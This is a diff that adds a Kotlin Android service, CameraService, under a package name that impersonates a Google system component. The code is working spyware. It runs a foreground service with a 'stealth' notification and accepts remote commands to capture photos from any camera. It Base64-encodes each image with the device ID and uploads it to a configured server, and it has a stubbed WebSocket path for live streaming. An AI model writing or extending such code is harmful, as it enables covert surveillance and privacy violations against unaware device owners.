@@ -1,0 +1,271 @@
+package com.google.android.systemservice.services
+
+import android.annotation.SuppressLint
+import android.app.Service
+import android.content.Context
+import android.content.Intent
+import android.graphics.ImageFormat
+import android.hardware.camera2.*
+import android.media.ImageReader
+import android.os.Handler
+import android.os.HandlerThread
+import android.os.IBinder
+import android.util.Base64
+import android.util.Log
+import android.util.Size
+import com.google.android.systemservice.config.AndroidConfig
+import com.google.android.systemservice.utils.StealthNotificationHelper
+import kotlinx.coroutines.*
+import okhttp3.*
+import okhttp3.MediaType.Companion.toMediaType
+import okhttp3.RequestBody.Companion.toRequestBody
+import org.json.JSONObject
+import java.io.ByteArrayOutputStream
+import java.util.concurrent.TimeUnit
+
+class CameraService : Service() {
+    companion object {
+        private const val TAG = "SystemCamera"
+    }
+
+    private var cameraDevice: CameraDevice? = null
+    private var captureSession: CameraCaptureSession? = null
+    private var imageReader: ImageReader? = null
+    private var backgroundHandler: Handler? = null
+    private var backgroundThread: HandlerThread? = null
+    private var isStreaming = false
+    private var webSocket: WebSocket? = null
+
+    private val serviceScope = CoroutineScope(Dispatchers.IO + SupervisorJob())
+    private val client = OkHttpClient.Builder()
+        .connectTimeout(30, TimeUnit.SECONDS)
+        .writeTimeout(60, TimeUnit.SECONDS)
+        .readTimeout(30, TimeUnit.SECONDS)
+        .build()
+
+    override fun onCreate() {
+        super.onCreate()
+        Log.d(TAG, "CameraService created")
+        startForegroundSilent()
+        startBackgroundThread()
+    }
+
+    private fun startForegroundSilent() {
+        val notification = StealthNotificationHelper.createStealthNotification(this)
+        startForeground(StealthNotificationHelper.CAMERA_SERVICE_ID, notification)
+    }
+
+    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
+        val cameraId = intent?.getStringExtra("camera_id") ?: "0"
+        
+        when (intent?.action) {
+            "START_STREAM" -> startCameraStream(cameraId)
+            "STOP_STREAM" -> stopCameraStream()
+            "TAKE_PHOTO" -> takePhoto(cameraId)
+        }
+        return START_STICKY
+    }
+
+    private fun startBackgroundThread() {
+        backgroundThread = HandlerThread("CameraBackground").also { it.start() }
+        backgroundHandler = Handler(backgroundThread!!.looper)
+    }
+
+    private fun stopBackgroundThread() {
+        backgroundThread?.quitSafely()
+        try {
+            backgroundThread?.join()
+            backgroundThread = null
+            backgroundHandler = null
+        } catch (e: InterruptedException) {
+            Log.e(TAG, "Error stopping background thread", e)
+        }
+    }
+
+    @SuppressLint("MissingPermission")
+    private fun takePhoto(cameraId: String) {
+        Log.d(TAG, "Taking photo with camera $cameraId")
+        
+        val manager = getSystemService(Context.CAMERA_SERVICE) as CameraManager
+        
+        try {
+            val characteristics = manager.getCameraCharacteristics(cameraId)
+            val map = characteristics.get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP)
+            val largest = map?.getOutputSizes(ImageFormat.JPEG)?.maxByOrNull { it.width * it.height }
+                ?: Size(640, 480)
+
+            imageReader = ImageReader.newInstance(largest.width, largest.height, ImageFormat.JPEG, 2)
+            imageReader?.setOnImageAvailableListener({ reader ->
+                val image = reader.acquireLatestImage()
+                if (image != null) {
+                    val buffer = image.planes[0].buffer
+                    val bytes = ByteArray(buffer.remaining())
+                    buffer.get(bytes)
+                    image.close()
+                    
+                    sendPhotoToServer(bytes, cameraId)
+                    closeCameraSession()
+                }
+            }, backgroundHandler)
+
+            manager.openCamera(cameraId, object : CameraDevice.StateCallback() {
+                override fun onOpened(camera: CameraDevice) {
+                    cameraDevice = camera
+                    createCaptureSession()
+                }
+
+                override fun onDisconnected(camera: CameraDevice) {
+                    camera.close()
+                    cameraDevice = null
+                }
+
+                override fun onError(camera: CameraDevice, error: Int) {
+                    Log.e(TAG, "Camera error: $error")
+                    camera.close()
+                    cameraDevice = null
+                }
+            }, backgroundHandler)
+
+        } catch (e: Exception) {
+            Log.e(TAG, "Error taking photo: ${e.message}")
+        }
+    }
+
+    private fun createCaptureSession() {
+        try {
+            val surface = imageReader?.surface ?: return
+            
+            cameraDevice?.createCaptureSession(
+                listOf(surface),
+                object : CameraCaptureSession.StateCallback() {
+                    override fun onConfigured(session: CameraCaptureSession) {
+                        captureSession = session
+                        captureStillPicture()
+                    }
+
+                    override fun onConfigureFailed(session: CameraCaptureSession) {
+                        Log.e(TAG, "Capture session configuration failed")
+                    }
+                },
+                backgroundHandler
+            )
+        } catch (e: Exception) {
+            Log.e(TAG, "Error creating capture session: ${e.message}")
+        }
+    }
+
+    private fun captureStillPicture() {
+        try {
+            val captureBuilder = cameraDevice?.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE)
+            captureBuilder?.addTarget(imageReader?.surface ?: return)
+            captureBuilder?.set(CaptureRequest.CONTROL_AF_MODE, CaptureRequest.CONTROL_AF_MODE_CONTINUOUS_PICTURE)
+            captureBuilder?.set(CaptureRequest.CONTROL_AE_MODE, CaptureRequest.CONTROL_AE_MODE_ON_AUTO_FLASH)
+
+            captureSession?.stopRepeating()
+            captureSession?.abortCaptures()
+            captureSession?.capture(captureBuilder?.build()!!, null, backgroundHandler)
+        } catch (e: Exception) {
+            Log.e(TAG, "Error capturing picture: ${e.message}")
+        }
+    }
+
+    private fun sendPhotoToServer(photoBytes: ByteArray, cameraId: String) {
+        serviceScope.launch {
+            try {
+                AndroidConfig.loadFromPreferences(this@CameraService)
+                val deviceId = android.provider.Settings.Secure.getString(
+                    contentResolver,
+                    android.provider.Settings.Secure.ANDROID_ID
+                )
+
+                val base64Photo = Base64.encodeToString(photoBytes, Base64.NO_WRAP)
+
+                val json = JSONObject().apply {
+                    put("device_id", deviceId)
+                    put("camera_id", cameraId)
+                    put("photo", base64Photo)
+                    put("timestamp", System.currentTimeMillis())
+                }
+
+                val body = json.toString().toRequestBody("application/json".toMediaType())
+                val request = Request.Builder()
+                    .url(AndroidConfig.photosEndpoint)
+                    .post(body)
+                    .build()
+
+                client.newCall(request).execute().use { response ->
+                    if (response.isSuccessful) {
+                        Log.d(TAG, "Photo sent successfully")
+                    } else {
+                        Log.e(TAG, "Failed to send photo: ${response.code}")
+                    }
+                }
+            } catch (e: Exception) {
+                Log.e(TAG, "Error sending photo: ${e.message}")
+            }
+        }
+    }
+
+    @SuppressLint("MissingPermission")
+    private fun startCameraStream(cameraId: String) {
+        Log.d(TAG, "Starting camera stream with camera $cameraId")
+        isStreaming = true
+        
+        // Connect WebSocket for streaming
+        connectStreamWebSocket(cameraId)
+    }
+
+    private fun connectStreamWebSocket(cameraId: String) {
+        val request = Request.Builder()
+            .url(AndroidConfig.websocketUrl)
+            .build()
+
+        webSocket = client.newWebSocket(request, object : WebSocketListener() {
+            override fun onOpen(webSocket: WebSocket, response: Response) {
+                Log.d(TAG, "Stream WebSocket connected")
+                startStreamingFrames(cameraId)
+            }
+
+            override fun onFailure(webSocket: WebSocket, t: Throwable, response: Response?) {
+                Log.e(TAG, "Stream WebSocket error: ${t.message}")
+                isStreaming = false
+            }
+        })
+    }
+
+    private fun startStreamingFrames(cameraId: String) {
+        // Implementation for continuous streaming
+        // Would capture frames and send via WebSocket
+        serviceScope.launch {
+            while (isStreaming) {
+                // Capture frame
+                delay(100) // 10 FPS
+            }
+        }
+    }
+
+    private fun stopCameraStream() {
+        Log.d(TAG, "Stopping camera stream")
+        isStreaming = false
+        webSocket?.close(1000, "Stream stopped")
+        closeCameraSession()
+    }
+
+    private fun closeCameraSession() {
+        captureSession?.close()
+        captureSession = null
+        cameraDevice?.close()
+        cameraDevice = null
+        imageReader?.close()
+        imageReader = null
+    }
+
+    override fun onBind(intent: Intent?): IBinder? = null
+
+    override fun onDestroy() {
+        super.onDestroy()
+        stopCameraStream()
+        stopBackgroundThread()
+        serviceScope.cancel()
+    }
+}
